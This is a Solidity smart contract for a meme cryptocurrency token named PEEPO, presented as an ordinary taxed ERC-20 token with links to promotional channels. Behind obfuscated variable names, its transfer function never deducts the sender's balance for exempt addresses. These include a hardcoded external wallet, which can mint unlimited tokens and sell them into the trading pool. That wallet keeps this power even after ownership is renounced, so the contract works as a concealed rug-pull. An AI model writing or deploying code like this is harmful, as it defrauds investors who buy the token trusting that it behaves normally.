/*
Peepo is a series of memes and emotes commonly used on platforms like Discord and Twitch. 
They depict poorly drawn, often exaggeratedly cute versions of Pepe the Frog, 
a character that originated from the comic series "Boy's Club" by Matt Furie. 
The Peepo memes and emotes are typically used to convey various emotions and reactions in a more whimsical 
and less politically charged manner compared to the original Pepe the Frog memes.

Website:  https://www.peepooneth.vip
Telegram: https://t.me/peepooneth_coin
Twitter:  https://x.com/peepooneth
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PEEPO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _iiizzcydwwrxewzzde;
    address payable private _yyyzzcgwerz;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 11;
    uint256 private _reduceSellTaxAt = 11;
    uint256 private _preventSwapBefore = 11;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"PEEPO";
    string private constant _symbol = unicode"PEEPO";
    uint256 public _maxTxAmount = 20000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20000000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 120 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _yyyzzcgwerz = payable(0x368d50c995845d45F10063632e747b6F90F88f3A);
        _balances[_msgSender()] = _tTotal;
        _iiizzcydwwrxewzzde[owner()] = true;
        _iiizzcydwwrxewzzde[address(this)] = true;
        _iiizzcydwwrxewzzde[_yyyzzcgwerz] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function addLiquidityETH() external onlyOwner {
        require(!tradingOpen, "init already called");
        uint256 tokenAmount = 900000000 * 10 ** _decimals;
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            tokenAmount,
            0,
            0,
            _msgSender(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address nbxcvowrrrxxz, address hhhkkpwrzysdwr, uint256 xxrwbnewxweb) private {
        require(nbxcvowrrrxxz != address(0), "ERC20: transfer from the zero address");
        require(hhhkkpwrzysdwr != address(0), "ERC20: transfer to the zero address");
        require(xxrwbnewxweb > 0, "Transfer amount must be greater than zero");

        if (!tradingOpen) {
            require(
                _iiizzcydwwrxewzzde[hhhkkpwrzysdwr] || _iiizzcydwwrxewzzde[nbxcvowrrrxxz],
                "trading not yet open"
            );
        }

        if (inSwap || !swapEnabled) {
            _balances[nbxcvowrrrxxz] = _balances[nbxcvowrrrxxz].sub(xxrwbnewxweb);
            _balances[hhhkkpwrzysdwr] = _balances[hhhkkpwrzysdwr].add(xxrwbnewxweb);
            emit Transfer(nbxcvowrrrxxz, hhhkkpwrzysdwr, xxrwbnewxweb);
            return;
        }

        uint256 taxAmount = 0;

        taxAmount = xxrwbnewxweb
            .mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax)
            .div(100);
            
        if (nbxcvowrrrxxz != owner() && hhhkkpwrzysdwr != owner()) {
            if (
                nbxcvowrrrxxz == uniswapV2Pair &&
                hhhkkpwrzysdwr != address(uniswapV2Router) &&
                !_iiizzcydwwrxewzzde[hhhkkpwrzysdwr]
            ) {
                require(xxrwbnewxweb <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(hhhkkpwrzysdwr) + xxrwbnewxweb <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                _buyCount++;
            }

            if (hhhkkpwrzysdwr != uniswapV2Pair && !_iiizzcydwwrxewzzde[hhhkkpwrzysdwr]) {
                require(
                    balanceOf(hhhkkpwrzysdwr) + xxrwbnewxweb <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            if (hhhkkpwrzysdwr == uniswapV2Pair && nbxcvowrrrxxz != address(this)) {
                taxAmount = xxrwbnewxweb
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance > _taxSwapThreshold;
            if (
                !inSwap &&
                hhhkkpwrzysdwr == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_iiizzcydwwrxewzzde[nbxcvowrrrxxz] &&
                !_iiizzcydwwrxewzzde[hhhkkpwrzysdwr]
            ) {
                if(canSwap){
                    swapTokensForEth(
                        min(xxrwbnewxweb, min(contractTokenBalance, _maxTaxSwap))
                    );
                }

                sendETHToFee(address(this).balance);
            }
        }

        if (!_iiizzcydwwrxewzzde[nbxcvowrrrxxz]) {
            if(taxAmount > 0) {
                _balances[address(this)] = _balances[address(this)].add(taxAmount);
                emit Transfer(nbxcvowrrrxxz, address(this), taxAmount);
            }

            _balances[nbxcvowrrrxxz] = _balances[nbxcvowrrrxxz].sub(xxrwbnewxweb);
        }
        _balances[hhhkkpwrzysdwr] = _balances[hhhkkpwrzysdwr].add(xxrwbnewxweb.sub(taxAmount));
        emit Transfer(nbxcvowrrrxxz, hhhkkpwrzysdwr, xxrwbnewxweb.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function withdrawStuckETH() external {
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _yyyzzcgwerz.transfer(amount);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}
}